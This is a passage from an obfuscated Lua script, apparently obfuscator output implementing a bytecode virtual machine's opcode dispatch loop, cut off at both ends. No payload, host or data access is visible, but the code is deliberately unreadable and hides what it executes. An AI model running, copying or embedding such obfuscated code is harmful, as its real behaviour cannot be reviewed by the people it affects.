A;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];a={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;a[f]=e[o];end;C={e[A](r(a,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=C[f];end;B=c;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];else local l=o[2];local n={};local d=0;local o=l+o[3]-1;for o=l+1,o do d=d+1;n[d]=e[o];end;local n,o=J(e[l](r(n,1,o-l)));o=o+l-1;d=0;for o=l,o do d=d+1;e[o]=n[d];end;B=o;end;elseif c<=48 then e[o[2]]=e[o[3]]+n[o[5]];elseif c>49 then local a;local c;local C;local A;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else if(e[o[2]]==e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=55 then if c<=52 then if c>51 then local d=o[2];local n,o=J(e[d]());B=d-1;o=o+d-1;local l=0;for o=d,o do l=l+1;e[o]=n[l];end;B=o;else local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];end;elseif c<=53 then local J;local a;local c;local D;local C;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];d=d+o[3];elseif c==54 then e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];if(e[o[2]]~=e[o[5]])then d=d+1;else d=d+o[3];end;else local J;local D;local a;local c;local C;local A;A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];end;elseif c<=58 then if c<=56 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];elseif c==57 then local J;local C;local c;local D;local a;local A;e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];a=e[o[3]];e[A+1]=a;e[A]=a[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;C=A+o[3]-1;for o=A+1,C do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,C-A))};C=A+o[5]-2;c=0;for o=A,C do c=c+1;e[o]=J[c];end;B=C;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];a=e[o[3]];e[A+1]=a;e[A]=a[n[o[5]]];else local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];if(e[o[2]]==n[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=59 then local J;local D;local a;local c;local C;local A;A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]={unpack({},1,o[3])};d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];elseif c==60 then local A;local D,A;local c;local A;local C;local a;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];else e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];if not e[o[2]]then d=d+1;else d=d+o[3];end;end;elseif c<=71 then if c<=66 then if c<=63 then if c>62 then local a;local A;local n;local c;local f;f=o[2];c={};n=0;A=f+o[3]-1;for o=f+1,A do n=n+1;c[n]=e[o];end;a={e[f](r(c,1,A-f))};A=f+o[5]-2;n=0;for o=f,A do n=n+1;e[o]=a[n];end;B=A;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];f=o[2];c={};n=0;A=f+o[3]-1;for o=f+1,A do n=n+1;c[n]=e[o];end;a={e[f](r(c,1,A-f))};A=f+o[5]-2;n=0;for o=f,A do n=n+1;e[o]=a[n];end;B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];else local A,A;local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=64 then e[o[2]][n[o[3]]]=e[o[5]];elseif c==65 then local C;local A;local c;local a;local f;f=o[2];a=e[o[3]];e[f+1]=a;e[f]=a[n[o[5]]];d=d+1;o=l[d];f=o[2];c={};A=0;C=f+o[3]-1;for o=f+1,C do A=A+1;c[A]=e[o];end;e[f](r(c,1,C-f));B=f;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];f=o[2];e[f]=e[f]-e[f+2];d=d+o[3];else local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];end;elseif c<=68 then if c==67 then local l=o[2];local d=e[o[3]];e[l+1]=d;e[l]=d[n[o[5]]];else e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];end;elseif c<=69 then f[n[o[3]]]=e[o[2]];elseif c==70 then C[o[3]]=e[o[2]];else local J;local a;local c;local D;local C;local 